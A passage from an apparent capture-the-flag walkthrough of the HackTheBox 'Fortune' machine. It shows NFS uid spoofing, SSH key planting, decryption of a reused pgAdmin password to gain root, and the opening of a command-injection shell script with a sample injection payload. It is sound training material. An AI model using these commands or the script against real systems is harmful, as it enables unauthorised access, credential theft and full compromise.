<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ssh -i fortune_id_rsa nfsuser@10.10.10.127
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;
</span></span></span></code></pre></div></div></p>

<p>OK. We have been authenticated but we cannot execute any command&hellip; What exactly is authpf?</p>

<p>The authpf utility is a user shell for authenticating gateways. An authenticating gateway is just like a regular network gateway (also known as a router) except that users must first authenticate themselves to it before their traffic is allowed to pass through. When a user&rsquo;s shell is set to /usr/sbin/authpf and they log in using SSH, authpf will make the necessary changes to the active pf ruleset so that the user&rsquo;s traffic is passed through the filter and/or translated using NAT/redirection. Once the user logs out or their session is disconnected, authpf will remove any rules loaded for the user and kill any stateful connections the user has open. Because of this, the ability of the user to pass traffic through the gateway only exists while the user keeps their SSH session open.</p>

<p>Hmmm&hellip; Interesting&hellip;</p>

<h2 id="2nd-enumeration-having-ntfuser-authenticated-to-authpf-via-ssh">2nd Enumeration (having ntfuser authenticated to authpf via ssh)</h2>

<p>Let&rsquo;s try to enumerate the ports/services again. This time while we are authenticated to authpf as ntfuser via ssh (make sure you have/keep that ssh session open):
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo htbscan.py 10.10.10.127
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-15 21:00:54 GMT
</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 111/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 817/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 2049/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 8081/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo nmap -A -p22,80,111,443,817,2049,8081 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-15 23:04 EET
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for fortune.htb (10.10.10.127)
</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.067s latency).
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT     STATE SERVICE    VERSION
</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp   open  ssh        OpenSSH 7.9 (protocol 2.0)
</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey:
</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp   open  http       OpenBSD httpd
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: OpenBSD httpd
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Fortune
</span></span></span><span class="line"><span class="cl"><span class="go">111/tcp  open  rpcbind    2 (RPC #100000)
</span></span></span><span class="line"><span class="cl"><span class="go">| rpcinfo:
</span></span></span><span class="line"><span class="cl"><span class="go">|   program version   port/proto  service
</span></span></span><span class="line"><span class="cl"><span class="go">|   100000  2            111/tcp  rpcbind
</span></span></span><span class="line"><span class="cl"><span class="go">|   100000  2            111/udp  rpcbind
</span></span></span><span class="line"><span class="cl"><span class="go">|   100003  2,3         2049/tcp  nfs
</span></span></span><span class="line"><span class="cl"><span class="go">|   100003  2,3         2049/udp  nfs
</span></span></span><span class="line"><span class="cl"><span class="go">|   100005  1,3          817/tcp  mountd
</span></span></span><span class="line"><span class="cl"><span class="go">|_  100005  1,3          889/udp  mountd
</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp  open  ssl/https?
</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: TLS randomness does not represent time
</span></span></span><span class="line"><span class="cl"><span class="go">817/tcp  open  mountd     1-3 (RPC #100005)
</span></span></span><span class="line"><span class="cl"><span class="go">2049/tcp open  nfs        2-3 (RPC #100003)
</span></span></span><span class="line"><span class="cl"><span class="go">8081/tcp open  http       OpenBSD httpd
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: OpenBSD httpd
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: pgadmin4
</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), FreeBSD 10.0-CURRENT (94%), OpenBSD 4.0 (94%), OpenBSD 5.0 (93%), OpenBSD 4.1 (93%), OpenBSD 4.6 (93%), OpenBSD 4.7 (93%), OpenBSD 6.0 (93%)
</span></span></span></code></pre></div></div></p>

<p>Wow! Now, we have access to more ports! We notice an nfs service:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> showmount -e 10.10.10.127
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Export list for 10.10.10.127:
</span></span></span><span class="line"><span class="cl"><span class="go">/home (everyone)
</span></span></span></code></pre></div></div></p>

<h2 id="spoofing-uid-gid-using-nfsshell">Spoofing uid/gid using nfsshell</h2>

<p>Neat, we have access to an nfs mount! We can use nfsshell to spoof our uid/gid:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nfsshell
</span></span><span class="line"><span class="cl"><span class="go">nfs&gt; host 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Using a privileged port (1023)
</span></span></span><span class="line"><span class="cl"><span class="go">Open 10.10.10.127 (10.10.10.127) TCP
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; export
</span></span></span><span class="line"><span class="cl"><span class="go">Export list for 10.10.10.127:
</span></span></span><span class="line"><span class="cl"><span class="go">/home   everyone
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; mount /home
</span></span></span><span class="line"><span class="cl"><span class="go">Using a privileged port (1022)
</span></span></span><span class="line"><span class="cl"><span class="go">Mount &#39;/home&#39;, TCP, transfer size 65536 bytes.
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; uid 1000
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; gid 1000
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; cd charlie
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; ls
</span></span></span><span class="line"><span class="cl"><span class="go">.
</span></span></span><span class="line"><span class="cl"><span class="go">..
</span></span></span><span class="line"><span class="cl"><span class="go">.Xdefaults
</span></span></span><span class="line"><span class="cl"><span class="go">.cshrc
</span></span></span><span class="line"><span class="cl"><span class="go">.cvsrc
</span></span></span><span class="line"><span class="cl"><span class="go">.login
</span></span></span><span class="line"><span class="cl"><span class="go">.mailrc
</span></span></span><span class="line"><span class="cl"><span class="go">.profile
</span></span></span><span class="line"><span class="cl"><span class="go">.ssh
</span></span></span><span class="line"><span class="cl"><span class="go">mbox
</span></span></span><span class="line"><span class="cl"><span class="go">user.txt
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; get user.txt
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; get mbox
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; quit
</span></span></span><span class="line"><span class="cl"><span class="go">Unmount &#39;/home&#39;
</span></span></span><span class="line"><span class="cl"><span class="go">Close &#39;10.10.10.127&#39;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> cat user.txt
</span></span><span class="line"><span class="cl"><span class="go">ad****************************40
</span></span></span></code></pre></div></div></p>

<p>Alternatively, If you have a user with uid=1000, you can simply mount the nfs share and read charlie&rsquo;s files:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> mkdir mnt_point
</span></span><span class="line"><span class="cl"><span class="gp">$</span> sudo mount -t nfs 10.10.10.127:/home mnt_point -o nolock
</span></span><span class="line"><span class="cl"><span class="gp">$</span> cat mnt_point/charlie/user.txt
</span></span><span class="line"><span class="cl"><span class="go">ad****************************40
</span></span></span></code></pre></div></div></p>

<h2 id="getting-charlie-shell">Getting charlie shell</h2>

<p>Of course we can add our public key to charlie&rsquo;s authorized_keys:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat ~/.ssh/id_rsa.pub &gt;&gt; mnt_point/charlie/.ssh/authorized_keys
</span></span></code></pre></div></div></p>

<p>Or we can use nfsshell for this as we did before:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nfsshell
</span></span><span class="line"><span class="cl"><span class="go">nfs&gt; host 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Using a privileged port (1023)
</span></span></span><span class="line"><span class="cl"><span class="go">Open 10.10.10.127 (10.10.10.127) TCP
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; mount /home
</span></span></span><span class="line"><span class="cl"><span class="go">Using a privileged port (1022)
</span></span></span><span class="line"><span class="cl"><span class="go">Mount &#39;/home&#39;, TCP, transfer size 65536 bytes.
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; uid 1000
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; gid 1000
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; cd charlie
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; cd .ssh
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; put id_rsa.pub authorized_keys
</span></span></span><span class="line"><span class="cl"><span class="go">WARNING: Create failed: File exists
</span></span></span><span class="line"><span class="cl"><span class="go">nfs&gt; quit
</span></span></span><span class="line"><span class="cl"><span class="go">Unmount &#39;/home&#39;
</span></span></span><span class="line"><span class="cl"><span class="go">Close &#39;10.10.10.127&#39;
</span></span></span></code></pre></div></div></p>

<p>Now, we can connect via SSH using public key authenticaion:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ssh -i ~/.ssh/id_rsa2 charlie@10.10.10.127
</span></span><span class="line"><span class="cl"><span class="go">Last login: Sat Aug  3 04:36:55 2019 from 10.10.12.158
</span></span></span><span class="line"><span class="cl"><span class="go">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Welcome to OpenBSD: The proactively secure Unix-like operating system.
</span></span></span><span class="line"><span class="cl"><span class="go">fortune$
</span></span></span></code></pre></div></div></p>

<h2 id="privilege-escalation">Privilege escalation</h2>

<p>Let&rsquo;s examine what there is inside &lsquo;mbox&rsquo; file:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat mbox
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">From bob@fortune.htb Sat Nov  3 11:18:51 2018
</span></span></span><span class="line"><span class="cl"><span class="go">Return-Path: &lt;bob@fortune.htb&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">Delivered-To: charlie@fortune.htb
</span></span></span><span class="line"><span class="cl"><span class="go">Received: from localhost (fortune.htb [local])
</span></span></span><span class="line"><span class="cl"><span class="go">	by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
</span></span></span><span class="line"><span class="cl"><span class="go">	for &lt;charlie@fortune.htb&gt;;
</span></span></span><span class="line"><span class="cl"><span class="go">	Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
</span></span></span><span class="line"><span class="cl"><span class="go">From:  &lt;bob@fortune.htb&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
</span></span></span><span class="line"><span class="cl"><span class="go">To: charlie@fortune.htb
</span></span></span><span class="line"><span class="cl"><span class="go">Subject: pgadmin4
</span></span></span><span class="line"><span class="cl"><span class="go">Message-ID: &lt;196699abe1fed384@fortune.htb&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">Status: RO
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Hi Charlie,
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Thanks for setting-up pgadmin4 for me. Seems to work great so far.
</span></span></span><span class="line"><span class="cl"><span class="go">BTW: I set the dba password to the same as root. I hope you don&#39;t mind.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Cheers,
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Bob
</span></span></span></code></pre></div></div></p>

<p>Password reuse&hellip; Let&rsquo;s search /var/appsrv/pgadmin4/pgadmin4.db:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep bob
</span></span></span><span class="line"><span class="cl"><span class="go">bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep charlie
</span></span></span><span class="line"><span class="cl"><span class="go">charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep dba
</span></span></span><span class="line"><span class="cl"><span class="go">postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22
</span></span></span></code></pre></div></div></p>

<p>Luckily for us, pgadmin4 is open source. Let&rsquo;s grab this script:</p>

<p><a href="https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py" target="_blank">https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py</a></p>

<p>All we need to do is to add one line in the end:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##########################################################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pgAdmin 4 - PostgreSQL Tools</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Copyright (C) 2013 - 2019, The pgAdmin Development Team</span>
</span></span><span class="line"><span class="cl"><span class="c1"># This software is released under the PostgreSQL Licence</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1">#########################################################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;This File Provides Cryptography.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">division</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">six</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.algorithms</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.modes</span> <span class="kn">import</span> <span class="n">CFB8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">padding_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">iv_size</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span> <span class="o">//</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    Decrypt the AES encrypted string.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    Parameters:
</span></span></span><span class="line"><span class="cl"><span class="s2">        ciphertext -- Encrypted string with AES method.
</span></span></span><span class="line"><span class="cl"><span class="s2">        key        -- key to decrypt the encrypted string.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[:</span><span class="n">iv_size</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">AES</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">key</span><span class="p">)),</span> <span class="n">CFB8</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="n">default_backend</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">iv_size</span><span class="p">:])</span> <span class="o">+</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Add padding to the key.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">six</span><span class="o">.</span><span class="n">text_type</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Key must be maximum 32 bytes long, so take first 32 bytes</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># If key size is 16, 24 or 32 bytes then padding is not required</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Add padding to make key 32 bytes long</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">padding_string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s2">&#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&#34;</span><span class="p">,</span> <span class="s2">&#34;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&#34;</span><span class="p">))</span></span></span></code></pre></div></p>

<p>That is we use the &lsquo;decrypt&rsquo; function to decrypt dba&rsquo;s password which was encrypted using Bob&rsquo;s AES encyption key. PBKDF2 (Password-Based Key Derivation Function 2) is a key derivation function with a sliding computational cost (to reduce susceptibility to brute force attacks).
We run the script and we get the password for root:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python crypto.py 
</span></span><span class="line"><span class="cl"><span class="go">b&#39;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&#39;
</span></span></span></code></pre></div></div></p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">fortune$ su root
</span></span></span><span class="line"><span class="cl"><span class="go">Password: R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
</span></span></span><span class="line"><span class="cl"><span class="go">fortune# cat /root/root.txt
</span></span></span><span class="line"><span class="cl"><span class="go">33****************************f8
</span></span></span></code></pre></div></div>

<h1 id="bonus-script-rce2shell-py">Bonus script: rce2shell.py</h1>

<p>Sometimes, we have some kind of Remote Command Execution but we cannot gain a full working shell (due to firewalls et.c). I wrote this <a href="https://github.com/Alamot/code-snippets/blob/master/rce2shell/rce2shell.py" target="_blank">script</a> for such cases. It tries to emulate a shell experience. Moreover, it offers download/upload capabilities using a variety of OS tools. Note, though, that this is still work in progress. In the future, I would like to make it quite broad in the sense of OSes/tools and RCEs it supports. But I don&rsquo;t know if I ever find the time to do that.</p>

<p>Anyway, for the time being, you can try it on the Fortune box.
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Status: WIP (Work In Progress)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Define a variable rce like this:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># rce = {&#34;method&#34;:&#34;POST&#34;,</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        &#34;url&#34;:&#34;http://10.10.10.127/select&#34;,</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        &#34;data&#34;:&#34;db=fortunes2%7C__RCE__%20%23&#34;,</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        &#34;remote_os&#34;:&#34;unix&#34;,</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        &#34;timeout&#34;:30}</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Use __RCE__ to mark the command injection point.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># To upload a file type: UPLOAD local_path remote_path</span>
</span></span><span class="line"><span class="cl"><span class="c1"># e.g. UPLOAD myfile.txt /tmp/myfile.txt</span>
</span></span><span class="line"><span class="cl"><span class="c1"># If you omit the remote_path it uploads the file on the current working folder.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># To download a file: DOWNLOAD remote_path</span>
</span></span><span class="line"><span class="cl"><span class="c1"># e.g. $ DOWNLOAD /temp/myfile.txt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">copy</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tqdm</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">shlex</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Python 2.X</span>
</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>
</span></span><span class="line"><span class="cl">    <span class="nb">input</span> <span class="o">=</span> <span class="n">raw_input</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>  <span class="c1"># Python 3+</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="n">BUFFER_SIZE</span> <span class="o">=</span> <span class="mi">5000</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Redirect stderr to stdout?</span>
</span></span><span class="line"><span class="cl"><span class="n">ERR2OUT</span> <span class="o">=</span> <span class="kc">True</span>
